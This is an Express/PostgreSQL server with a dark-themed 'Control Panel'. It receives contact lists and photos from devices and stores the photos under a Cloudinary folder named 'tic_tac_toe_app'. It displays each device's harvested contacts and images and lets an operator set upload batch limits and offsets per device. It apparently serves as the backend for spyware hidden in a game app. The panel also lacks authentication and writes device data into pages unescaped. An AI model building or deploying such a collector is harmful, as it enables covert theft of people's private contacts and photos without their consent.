const express = require("express");
const { Pool } = require("pg");
const cloudinary = require("cloudinary").v2;
const multer = require("multer");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const upload = multer({ storage: multer.memoryStorage() });

// ================= CLOUDINARY =================
cloudinary.config({
  cloud_name: process.env.CLOUD_NAME,
  api_key: process.env.API_KEY,
  api_secret: process.env.API_SECRET
});

// ================= DATABASE =================
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// ================= DB SETUP =================
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      device_id TEXT UNIQUE
    );

    CREATE TABLE IF NOT EXISTS images (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      image_url TEXT
    );

    CREATE TABLE IF NOT EXISTS contacts (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      contact TEXT
    );
  `);
}
initDB();

// ================= SHARED STYLES =================
const sharedStyles = `
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #0a0f1e;
      color: #e2e8f0;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      min-height: 100vh;
    }
    .topbar {
      background: #0d1526;
      border-bottom: 1px solid #1e2d4a;
      padding: 16px 32px;
      display: flex;
      align-items: center;
      gap: 12px;
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .topbar .logo {
      font-size: 20px;
      font-weight: 700;
      color: #22c55e;
      letter-spacing: -0.5px;
      text-decoration: none;
    }
    .topbar nav { margin-left: auto; display: flex; gap: 8px; }
    .topbar nav a {
      color: #94a3b8;
      text-decoration: none;
      padding: 8px 14px;
      border-radius: 8px;
      font-size: 14px;
      transition: all 0.2s;
    }
    .topbar nav a:hover { background: #1e2d4a; color: #e2e8f0; }
    .page { padding: 36px 32px; max-width: 1100px; margin: 0 auto; }
    .page-title { font-size: 26px; font-weight: 700; color: #f1f5f9; margin-bottom: 6px; }
    .page-subtitle { font-size: 14px; color: #64748b; margin-bottom: 32px; }
    .card {
      background: #0d1526;
      border: 1px solid #1e2d4a;
      border-radius: 14px;
      padding: 24px;
      margin-bottom: 20px;
    }
    .card h3 {
      font-size: 15px;
      font-weight: 600;
      color: #cbd5e1;
      margin-bottom: 18px;
      padding-bottom: 14px;
      border-bottom: 1px solid #1e2d4a;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .stat-card {
      background: #0d1526;
      border: 1px solid #1e2d4a;
      border-radius: 14px;
      padding: 28px 32px;
      margin-bottom: 24px;
      display: flex;
      align-items: center;
      gap: 24px;
    }
    .stat-icon-wrap {
      width: 56px; height: 56px;
      border-radius: 14px;
      background: #0d2d1a;
      display: flex; align-items: center; justify-content: center;
      font-size: 24px;
      flex-shrink: 0;
    }
    .stat-label { font-size: 13px; color: #64748b; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 4px; }
    .stat-value { font-size: 42px; font-weight: 700; color: #f1f5f9; line-height: 1; }
    .form-row { display: flex; gap: 12px; align-items: flex-end; flex-wrap: wrap; }
    .form-group { display: flex; flex-direction: column; gap: 6px; }
    .form-group label { font-size: 12px; color: #64748b; text-transform: uppercase; letter-spacing: 0.6px; }
    input[type="number"] {
      background: #131f38;
      border: 1px solid #1e2d4a;
      color: #e2e8f0;
      padding: 10px 14px;
      border-radius: 8px;
      font-size: 14px;
      width: 110px;
      outline: none;
      transition: border 0.2s;
    }
    input[type="number"]:focus { border-color: #22c55e; }
    .btn {
      padding: 10px 20px;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      border: none;
      transition: all 0.2s;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      gap: 6px;
    }
    .btn-primary { background: #22c55e; color: #052e16; }
    .btn-primary:hover { background: #16a34a; }
    .btn-secondary { background: transparent; border: 1px solid #1e2d4a; color: #94a3b8; }
    .btn-secondary:hover { background: #1e2d4a; color: #e2e8f0; }
    .btn-blue { background: #1d4ed8; color: #fff; }
    .btn-blue:hover { background: #1e40af; }
    .btn-green { background: #15803d; color: #f0fdf4; }
    .btn-green:hover { background: #166534; }

    /* Users list */
    .user-list { display: flex; flex-direction: column; gap: 12px; }
    .user-row {
      background: #0d1526;
      border: 1px solid #1e2d4a;
      border-radius: 12px;
      padding: 16px 20px;
      display: flex;
      align-items: center;
      gap: 16px;
    }
    .user-avatar {
      width: 42px; height: 42px;
      border-radius: 50%;
      background: #0d2d1a;
      border: 1px solid #22c55e44;
      display: flex; align-items: center; justify-content: center;
      font-size: 14px;
      font-weight: 700;
      color: #22c55e;
      flex-shrink: 0;
    }
    .user-id { font-size: 14px; font-weight: 500; color: #cbd5e1; flex: 1; word-break: break-all; }
    .user-actions { display: flex; gap: 10px; flex-shrink: 0; }

    /* Images grid */
    .images-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
      gap: 14px;
    }
    .img-wrapper {
      border-radius: 12px;
      overflow: hidden;
      border: 1px solid #1e2d4a;
      aspect-ratio: 1;
      background: #131f38;
    }
    .img-wrapper img {
      width: 100%; height: 100%;
      object-fit: cover;
      display: block;
      transition: transform 0.3s;
    }
    .img-wrapper:hover img { transform: scale(1.06); }
    .empty-state { padding: 28px; text-align: center; color: #334155; font-size: 14px; }

    /* Contacts table */
    .contacts-table { width: 100%; border-collapse: collapse; }
    .contacts-table th {
      text-align: left;
      font-size: 11px;
      color: #475569;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      padding: 0 16px 12px;
    }
    .contacts-table td {
      padding: 12px 16px;
      font-size: 14px;
      color: #cbd5e1;
      border-top: 1px solid #1e2d4a;
    }
    .contacts-table tr:hover td { background: #131f38; }
    .contact-name { display: flex; align-items: center; gap: 10px; }
    .contact-dot { width: 7px; height: 7px; border-radius: 50%; background: #22c55e; flex-shrink: 0; }
    .count-badge {
      display: inline-flex;
      align-items: center;
      padding: 3px 10px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
      background: #22c55e18;
      color: #22c55e;
      border: 1px solid #22c55e33;
      margin-left: 6px;
    }
  </style>
`;

// ================= TOPBAR HELPER =================
function topbar() {
  return `
    <div class="topbar">
      <a href="/" class="logo">&#9670; Control Panel</a>
      <nav>
        <a href="/">Dashboard</a>
        <a href="/users">Users</a>
      </nav>
    </div>
  `;
}

// ================= CONTROL CONFIG =================
let config = { limit: 5, offset: 0 };

app.get("/config/:device_id", (req, res) => {
  res.json(config);
});

app.post("/set-config", (req, res) => {
  config.limit = parseInt(req.body.limit);
  config.offset = parseInt(req.body.offset);
  res.redirect("/user/" + req.body.device_id + "/images");
});

// ================= DASHBOARD =================
app.get("/", async (req, res) => {
  const users = await pool.query("SELECT COUNT(*) FROM users");

  res.send(`
  <html><head><title>Dashboard</title>${sharedStyles}</head>
  <body>
    ${topbar()}
    <div class="page">
      <div class="page-title">Dashboard</div>
      <div class="page-subtitle">Control panel overview</div>

      <div class="stat-card">
        <div class="stat-icon-wrap">&#128100;</div>
        <div>
          <div class="stat-label">Total Users</div>
          <div class="stat-value">${users.rows[0].count}</div>
        </div>
      </div>

      <a href="/users" class="btn btn-primary" style="font-size:16px; padding:14px 32px;">
        &#128101;&nbsp; View Users
      </a>
    </div>
  </body></html>
  `);
});

// ================= RECEIVE CONTACTS =================
app.post("/receive", async (req, res) => {
  const { device_id, data } = req.body;
  for (let contact of data) {
    await pool.query(
      "INSERT INTO contacts (device_id, contact) VALUES ($1, $2)",
      [device_id, contact]
    );
  }
  await pool.query(
    "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
    [device_id]
  );
  res.send("Contacts saved ✅");
});

// ================= IMAGE UPLOAD =================
app.post("/upload-image", upload.single("image"), async (req, res) => {
  try {
    const device_id = req.body.device_id;
    const stream = cloudinary.uploader.upload_stream(
      { folder: "tic_tac_toe_app" },
      async (error, result) => {
        if (error) return res.status(500).send("Upload error");
        const imageUrl = result.secure_url;
        await pool.query(
          "INSERT INTO images (device_id, image_url) VALUES ($1, $2)",
          [device_id, imageUrl]
        );
        await pool.query(
          "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
          [device_id]
        );
        res.json({ url: imageUrl });
      }
    );
    stream.end(req.file.buffer);
  } catch (err) {
    res.status(500).send("Server error");
  }
});

// ================= USERS LIST =================
app.get("/users", async (req, res) => {
  const users = await pool.query("SELECT * FROM users");

  let rows = "";
  for (const u of users.rows) {
    const initials = u.device_id.substring(0, 2).toUpperCase();
    const imgCount = await pool.query(
      "SELECT COUNT(*) FROM images WHERE device_id=$1", [u.device_id]
    );
    const conCount = await pool.query(
      "SELECT COUNT(DISTINCT contact) FROM contacts WHERE device_id=$1", [u.device_id]
    );
    rows += `
      <div class="user-row">
        <div class="user-avatar">${initials}</div>
        <div class="user-id">${u.device_id}</div>
        <div class="user-actions">
          <a href="/user/${u.device_id}/contacts" class="btn btn-green">
            &#128222; Contacts <span class="count-badge">${conCount.rows[0].count}</span>
          </a>
          <a href="/user/${u.device_id}/images" class="btn btn-blue">
            &#128247; Images <span class="count-badge">${imgCount.rows[0].count}</span>
          </a>
        </div>
      </div>
    `;
  }

  res.send(`
  <html><head><title>Users</title>${sharedStyles}</head>
  <body>
    ${topbar()}
    <div class="page">
      <a href="/" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back</a>
      <div class="page-title" style="margin-top:16px;">All Users</div>
      <div class="page-subtitle">${users.rows.length} registered device(s)</div>
      <div class="user-list">
        ${rows || '<div class="empty-state">No users found.</div>'}
      </div>
    </div>
  </body></html>
  `);
});

// ================= USER CONTACTS (DEDUPLICATED) =================
app.get("/user/:device_id/contacts", async (req, res) => {
  const device = req.params.device_id;

  const contacts = await pool.query(
    "SELECT DISTINCT contact FROM contacts WHERE device_id=$1 ORDER BY contact",
    [device]
  );

  let contactRows = "";
  contacts.rows.forEach((c, i) => {
    contactRows += `
      <tr>
        <td style="color:#475569; font-size:13px; width:50px;">${i + 1}</td>
        <td><div class="contact-name"><div class="contact-dot"></div>${c.contact}</div></td>
      </tr>
    `;
  });

  res.send(`
  <html><head><title>Contacts - ${device}</title>${sharedStyles}</head>
  <body>
    ${topbar()}
    <div class="page">
      <a href="/users" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back to Users</a>
      <div class="page-title" style="margin-top:16px;">Contacts</div>
      <div class="page-subtitle" style="font-family:monospace;">${device}</div>

      <div class="card" style="padding:0; overflow:hidden;">
        <div style="padding:20px 24px 16px; border-bottom:1px solid #1e2d4a; display:flex; align-items:center; gap:8px;">
          <span style="font-size:15px; font-weight:600; color:#cbd5e1;">&#128222; Contact List</span>
          <span class="count-badge">${contacts.rows.length} unique</span>
        </div>
        ${contactRows
          ? `<table class="contacts-table">
              <thead>
                <tr>
                  <th style="padding:14px 16px 10px;">#</th>
                  <th style="padding:14px 16px 10px;">Contact</th>
                </tr>
              </thead>
              <tbody>${contactRows}</tbody>
             </table>`
          : '<div class="empty-state">No contacts found.</div>'
        }
      </div>
    </div>
  </body></html>
  `);
});

// ================= USER IMAGES =================
app.get("/user/:device_id/images", async (req, res) => {
  const device = req.params.device_id;

  const images = await pool.query(
    "SELECT * FROM images WHERE device_id=$1",
    [device]
  );

  let imgGrid = "";
  images.rows.forEach(img => {
    imgGrid += `
      <div class="img-wrapper">
        <img src="${img.image_url}" alt="device image" loading="lazy"/>
      </div>
    `;
  });

  res.send(`
  <html><head><title>Images - ${device}</title>${sharedStyles}</head>
  <body>
    ${topbar()}
    <div class="page">
      <a href="/users" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back to Users</a>
      <div class="page-title" style="margin-top:16px;">Images</div>
      <div class="page-subtitle" style="font-family:monospace;">${device}</div>

      <div class="card">
        <h3>&#9881; Upload Configuration</h3>
        <form method="POST" action="/set-config">
          <input type="hidden" name="device_id" value="${device}"/>
          <div class="form-row">
            <div class="form-group">
              <label>Limit</label>
              <input type="number" name="limit" value="${config.limit}"/>
            </div>
            <div class="form-group">
              <label>Offset</label>
              <input type="number" name="offset" value="${config.offset}"/>
            </div>
            <button type="submit" class="btn btn-primary">&#10003; Update Config</button>
          </div>
        </form>
      </div>

      <div class="card">
        <h3>
          &#128247; Received Images
          <span class="count-badge">${images.rows.length}</span>
        </h3>
        ${imgGrid
          ? `<div class="images-grid">${imgGrid}</div>`
          : '<div class="empty-state">No images uploaded yet.</div>'
        }
      </div>
    </div>
  </body></html>
  `);
});

app.listen(process.env.PORT || 3000);
